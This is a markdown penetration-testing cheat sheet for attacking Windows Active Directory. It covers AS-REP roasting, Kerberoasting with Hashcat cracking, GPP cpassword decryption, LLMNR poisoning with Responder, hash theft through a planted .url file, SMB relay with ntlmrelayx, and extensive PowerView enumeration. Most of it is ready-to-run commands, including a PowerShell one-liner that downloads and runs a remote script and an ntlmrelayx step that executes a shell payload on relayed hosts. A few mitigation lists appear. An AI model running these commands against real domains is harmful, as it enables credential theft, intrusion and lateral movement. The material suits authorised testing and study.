## AS-REP roasting (Dump users hashes, pre-authentication disabled, Rubeus/)
```
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request.
After validating the timestamp the KDC will then issue a TGT for the user.
If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user
is really who they say that they are.

Rubeus automatically enumerate eligible users havingpre authrntication disabled whereas impacket requires us to give a list of users
on target we can check which users have pre authentication disabled through powershell

    get-aduser -filter * -properties DoesNotRequirePreAuth | where {$.DoesNotRequirePreAuth -eq "True" -and $.Enabled -eq "True"} | select Name

Using PowerView.ps1
    Get-DomainUser -PreauthNotRequired Get-DomainUser -UACFilter DONT_REQ_PREAUTH

    Using Impacket (REmotely without authentication)
    we require list of usernames on target. we can find those from kerbrute and supply here

    Without AUthentication
    sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/ -dc-ip IPADDRESS -users kerbuser.txt -no-pass

With Authentication                
    sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/Machine1:Password1 -dc-ip IPADDRESS -users kerbuser.txt

Using Rubeus
using rubeus is prefereed because it automatically enumerates users
Rubeus.exe asreproast (we can also specify specific user to target by adding /username:password in this command. also domain or domaincontroller)

            or
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

AS-REP Roasting
The first step of the authentication process via Kerberos is to send an AS-REQ. 
Based on this request, the DC can validate if authentication is successful. 
If it is, the domain controller replies with an AS-REP containing the session key and TGT. 
This step is also commonly referred to as Kerberos preauthentication and prevents offline password guessing.

Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the DC on behalf of any AD user. 
After obtaining the AS-REP from the DC, you can perform an offline password attack against the encrypted part of the response.
This attack is known as AS-REP Roasting.
 
 By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. 
 However, it is possible to enable this account option manually. 

From remotely our Kali machine first, then locally on Windows. 
On Kali, we can use impacket-GetNPUsers to perform AS-REP roasting. 
We'll need to enter the IP address of the DC as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.

Finally, we need to specify the target authentication information in the format domain/user, this is the user we use for authentication. 
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/mute

Using GetNPUsers to perform AS-REP roasting
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/muted
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
muted            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
muted has the user account option Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting.

Obtaining the correct mode for Hashcat
By default, the resulting hash format of impacket-GetNPUsers is compatible with Hashcat. 
Check the correct mode for the AS-REP hash by grepping for "Kerberos" in the Hashcat help.

kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
   
The output of the grep command shows that the correct mode for AS-REP is 18200.

We've collected what we need to use Hashcat and crack the AS-REP hash. 
Enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as rule file, and --force to perform the cracking on your Kali VM.

kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

AS-REP Roasting on Windows. 
We'll use Rubeus, which is a tool for raw Kerberos interactions and abuse.

PS C:\mute> .\Rubeus.exe asreproast /nowrap
PS C:\mute> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast <-- Might as well do a quick kerberoast while your cooking.

kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

 ## Kerberoasting
 ```
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
If the service has a registered SPN then it can be Kerberoasted, however, the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.
To enumerate Kerberoastable accounts use a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections
they have to the rest of the domain.

If we are on the target and need to find all the spn accounts
    setspn -T offense -Q /

or some powerview cmdlets
    Get-NetUser -SPN

Or to get info about a service account of a specific group:
    Get-NetUser -SPN | ?{$_.memberof -match 'GroupName'}
    Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
    get-adobject | Where-Object {$.serviceprincipalname -ne $null -and $.distinguishedname -like "CN=Users" -and $_.cn -ne "krbtgt"}

    Using Impacket:
This can be done remotely but for this we need a remote connection as any user on the target system.
controller.local is domain name , Machine1 is PC name and Password1 is a password
    sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.172.234 -request

    using Rubeus:
This command will dump hashes of available service accounts
    Rubeus.exe kerberoast (we can also specify specific user to target by adding /username:password in this command.also domain or domaincontroller)

NOw copy the hash and crack in our machine

What Can a Service Account do?
After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not.
If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit.
If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts;
many companies may reuse the same or similar passwords for their service or domain admin users.
If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

Mitigations:
    Strong Complex passwords
    Dont make service accounts domain admins

Windows
Rubeus Kerberoast:
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

Reviewing the correct Hashcat mode
kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol

Cracking:
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Linux
Remotely kerberoast
Perform Kerberoasting from Linux.
Use impacket-GetUserSPNs with the IP of the domain controller as the argument for -dc-ip.
Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash.
As before, we can use -request to obtain the TGS and output them in a compatible format for Hashcat.

Using impacket-GetUserSPNs to perform Kerberoasting on Linux to obtain TGS-REP hash:
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/mute

Cracking:
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," synchronize the time of the Kali machine with the domain controller. You can use ntpdate3 or rdate4 to do so.

What is Kerberos? -
Kerberos is the default authentication service for Microsoft Windows domains.
It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption.
Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

Common Terminology -
Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

AS-REQ w/ Pre-Authentication In Detail -
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC.
In order to validate the user and create a TGT for the user, the KDC must follow these exact steps.
The first step is for the user to encrypt a timestamp NT hash and send it to the AS.
The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -
In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Service Ticket Contents -
To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated.
A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

Kerberos Authentication Overview -
AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
AP-REP - 6.) The service grants access

Kerberos Tickets Overview -
The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -
Kerbrute Enumeration - No domain access required 
Pass the Ticket - Access as a user to the domain required
Kerberoasting - Access as any user required
AS-REP Roasting - Access as any user required
Golden Ticket - Full domain compromise (domain admin) required 
Silver Ticket - Service hash required 
Skeleton Key - Full domain compromise (domain admin) required
```

## GPO Abuse
```
If we see GPO mentioned in bloodhound graph,then that means we can perform actions on behalf of that group policy object

SharpGPOAbuse is an excellent tool for GP related attacks
gpp attack (group policy preferences) MS14-025

In this attack we utilize a windows misconfiguration in which we can read credentials which admin stores in a xml file named Groups.xml.
This policy is stored in SYSVOL share which is readbale by every authenticated domain user to access policies etc we can get local admins and domain admins credentials which are utilizing the policies in SYSVOL share

we get password in a cpassword type but we can decrypt it from kali or online because the key to this encryption was leaked from microsoft

We can utilize metasploit module gpp enum to get passwords

we can also use a powershell script called Get-GPPPassword

    This command will give all cleartext passwords from the found SYSVOL share.Remember that we are interested in passwords from Groups.xml

    Get-GPPPassword

    This command will look for all SYSVOL shares for the entire domain

    Get-GPPPassword -Server domain.name

    This command will search whole forest by mapping out trusts and accessing the accessible SYSVOL shares

    Get-GPPPassword -SearchForest

    This will list out the found passwords only

    Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq

If we get access of Groups.xml in any other way we can copy the password stored in cpassword variable and decrypt using a tool called gpp decrypt

    gpp-decrypt passwordhash
```

## GetADUsers
```
If we have credentials of the machine then we can enumerate users more accurately with impacket
    GetADUSers.py -all domain.name/USER:PASS@computername -dc-ip IPADDRESS
```

## GetUserSPNs.py
```
The GetUserSPNs.py tool is part of the Impacket Suite of Tools
The beautiful thing about the GetUserSPNs.py script is that it is executed remotely on the attacker side, which means it is not necessary to have a foothold on the victim to perform this attack. 
However, you will still need a valid user/pass combo as that is ALWAYS a requirement for kerberoasting.

Now, using the following command, we can remotely request a service ticket (change the user/pass and IP for your needs):

GetUserSPNs.py corp.local/muted:pAssWord123 -dc-ip 172.16.1.5 -request
```

## LLMNR/NBT-NS poisoning
```
This attack happens when any user or computer request a resource or ip which the network dns fails to resolve(Meaning they either mistyped or requesting non existing resource). LLMNR is a Windows AD feature which tries to resolve request when DNS fails.  We as an attacker can respond to the user using a tool called responder and act as a LLMNR server. LLMNR key flaw is that it requires user hash to work. We request users hash from the user and say we will resolve their request and this way we perform a mitm attack inside a AD network

NOte: This attack assumes we have network access same as the target

    Run responder
    responder -I interface(eth0,tun0 etc) -rdw

    Assume a user on the network tries to connect to a wrong smb share ,we will act as a llmnr server because dns fails and get the hash

    \shre
    we get the hash and now can crack it ,pass the hash etc

Defense against LLMNR poisoning:

    Disable LLMNR and NBT-NS
    If LLMNR is required by the company ,then enforce NAC or network access control which means that only the devices with authorized MAC addresses can connect to the internal network.
    Set comnplex Password policy so captured hash cannot be cracked easily



Url File Attacks (requires access to a domain machine and a writabele share)
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share

In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share. We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine

    create a file with following text and name it like "@anyname.url"

[InternetShortcut] URL=blah WorkingDirectory=blah IconFile=\AttackerIP%USERNAME%.icon IconIndex=1

    Now we run responder and wait for the file to be opened
    responder -I eth0 -rdw



SMB Relay attack
In this attack we utilize llmnr poisoning and then use the captured hashes to dump sensitive critical information on other machines in the network.We utilize responder and ntlmrelay tool. Requirement for this is that smb signing must be disabled on target and the hash of the user which we captured,must be admin on the target machine.

    We need to narrow down all the targets which have smb signing disabled or enabled but are not required for logging in.

    nmap --script=smb2-security-mode.nse -p445

    Edit the /etc/responder/Responder.conf file to disable smb and http flags to off

    run responder

    responder -I interface -rdw

    now run ntlmrelay

    ntlmrelayx.py -tf targetlist.txt -smb2support

    Now any user must cause the llmnr attack and our smb relay attack will work

    We will receive SAM hashes and hives etc.

                OR

when running ntlm relay we can specify -i flag to get a interactive session.Then we nc into that specific local port and get bunch of feauturs.

    ntlmrelayx.py -tf targetlist.txt -smb2support -i

We can also specify -e to execute an executable when succesful.We can create a msfvenom exe payload and and specify that and get a meterpreter shell or any common shell

    ntlmrelayx.py -tf targetlist.txt -smb2support -e shell.exe

Mitigation:

    enable smb signing on every device across the network
    Disable ntlm authentication on the network(kerberos more secure)
    Limit local administrators across the network(a admin of single workstation is also admin of many other workstations which allows this attack)
```

## PowerView.ps1 
```
Post Compromise Enumeration
Once we have gained access in a machine from the network

    Gather info using powerview
    Map the AD environment by using bloodhound

PowerView.ps1
First bypass powershell execution policy and then import powerview
    powershell -ep bypass
    . .\Powerview.ps1

Get-DomainUser is used for whole domain and Get-NetUser for current Computer on which we have foothold
domain info:
    Get-NetDomain

Displays Domain controllers info:
    Get-NetDomainController

Get list of Network info:
    Get-NetIPAddress

Domain policy:
    Get-DomainPolicy

We will get few objects and we can view detailed info by following command.for eg if we get some info about system access object ,we will insert the object name in below command
    (Get-DomainPolicy."above command output")

See open ports
    Get-NetTCPConnection | where-Object -Property State -match listen

Get Computer information in domain
    Get-NetComputer -fulldata

to get only OS on computers
    Get-NetComputer -fulldata | select operatingsystem

Get list of users on local machine
    Get-LocalUser

Get list of Users on domain
    Get-NetUser

To view only usernames
    Get-NetUser | select cn

Detecting Honeypots in the networks
    Get-UserProperty -Properties logoncount

Seeing which account has multiple retries in authetntication
    Get-UserProperty -Properties badpwdcount

Get all groupsname on domain
    Get-NetGroup -GroupName *

Get local groups of current machine
    Get-NetLocalGroup SERVER.domain.local

Get Service accounts passwords and info
    Get-NetUser -SPN

Or to get info about service account of specific group
    Get-NetUser -SPN | ?{$_.memberof -match 'GroupName'}
    Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
    get-adobject | Where-Object {$.serviceprincipalname -ne $null -and $.distinguishedname -like "CN=Users" -and $_.cn -ne "krbtgt"}

See recently applied patches
    Get-HOtfix

Find available shares
    Invoke-ShareFinder


PowerView.ps1
PS C:\Tools> Import-Module .\PowerView.ps1 or . .\PowerView.ps1 

Get-NetDomain
Get-NetUser
Get-NetUser | select cn  <-- The cn attribute holds the username of the user. Pipe the output into select and choose the cn attribute
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Find-LocalAdminAccess
Find-DomainShare

SPNs
SPNs via PowerView.ps1
Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. 
Obtain a clear list of SPNs by piping the output into select and choose the samaccountname and serviceprincipalname attributes:
Get-NetUser -SPN | select samaccountname,serviceprincipalname

Shares
Find-DomainShare  <-- use PowerView's Find-DomainShare function to find the shares in the domain. 
By default, the SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name on the domain controller and every domain user has access to it.
ls \\FILES04\docshare
ls \\dc1.site.com\sysvol\corp.com\
ls \\dc1.site.com\sysvol\corp.com\Policies\
cat \\dc1.site.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml  <-- Maybe you can find some old backup xml files.
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"   <-- Gpp-decrypt any encrypted strings you find in shares. 

Basic Domain Information
Get-NetDomain

User Information
Get-NetUser
Get-NetUser | select samaccountname, description, logoncount
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount
Get-NetUser -LDAPFilter '(sidHistory=*)'
Get-NetUser -PreauthNotRequired
Get-NetUser -SPN

Groups Information
Get-NetGroup | select samaccountname,description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName

Computers Information  
Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrained | select samaccountname 
Get-NetComputer -TrustedToAuth | select samaccountname
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*

Domain Info
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID
​
Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."System Access" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
​
Domain Controller
Get-NetDomainController -Domain mydomain.local #Get Domain Controller# Domain Info
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID
​
Users, Groups and Computers
Users
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select -ExpandProperty samaccountname #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter

User Information
Get-NetUser
Get-NetUser | select samaccountname, description, logoncount
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount
Get-NetUser -LDAPFilter '(sidHistory=*)'
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
​
Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth #Useful for Kerberos constrain delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation

Groups
Get-NetGroup | select samaccountname,description
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount #Search admin groups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-NetGPOGroup #Get restricted groups
​
DNS Hostname
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*

Logons and Sessions
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)

Shared Files and Folders
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters

GPOs & OUs
GPO
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}

ACL
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs #Get ACLs of an object (permissions of other objects over the indicated one)
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" #Get permissions of a file
Find-InterestingDomainAcl -ResolveGUIDs #Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} #Check if any of the interesting permissions founds is realated to a username/group
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights #Get special rights over All administrators in domain

Domain Trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts
​Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)" 
​Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)
​Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```

## Powerview (Extended)
```
# PowerView's last major overhaul is detailed here: http://www.harmj0y.net/blog/powershell/make-powerview-great-again/
#   tricks for the 'old' PowerView are at https://gist.github.com/HarmJ0y/3328d954607d71362e3c

# the most up-to-date version of PowerView will always be in the dev branch of PowerSploit:
#   https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

# New function naming schema:
#   Verbs:
#       Get : retrieve full raw data sets
#       Find : ‘find’ specific data entries in a data set
#       Add : add a new object to a destination
#       Set : modify a given object
#       Invoke : lazy catch-all
#   Nouns:
#       Verb-Domain* : indicates that LDAP/.NET querying methods are being executed
#       Verb-WMI* : indicates that WMI is being used under the hood to execute enumeration
#       Verb-Net* : indicates that Win32 API access is being used under the hood


# get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
Get-DomainGroup -MemberIdentity <User/Group>

# get all the effective members of a group, 'recursing down'
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred

# retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}

# get all users with passwords changed > 1 year ago, returning sam account names and password last set times
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset

# all enabled users, returning distinguishednames
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname

# all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE

# all users that require smart card authentication
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED

# all users that *don't* require smart card authentication, only returning sam account names
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

# use multiple identity types for any *-Domain* function
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

# find all users with an SPN set (likely service accounts)
Get-DomainUser -SPN

# check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# find any users/computers with constrained delegation st
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount

# return the local *groups* of a remote server
Get-NetLocalGroup SERVER.domain.local

# return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local

# Kerberoast any users in a particular OU with SPNs set
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

# find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..."

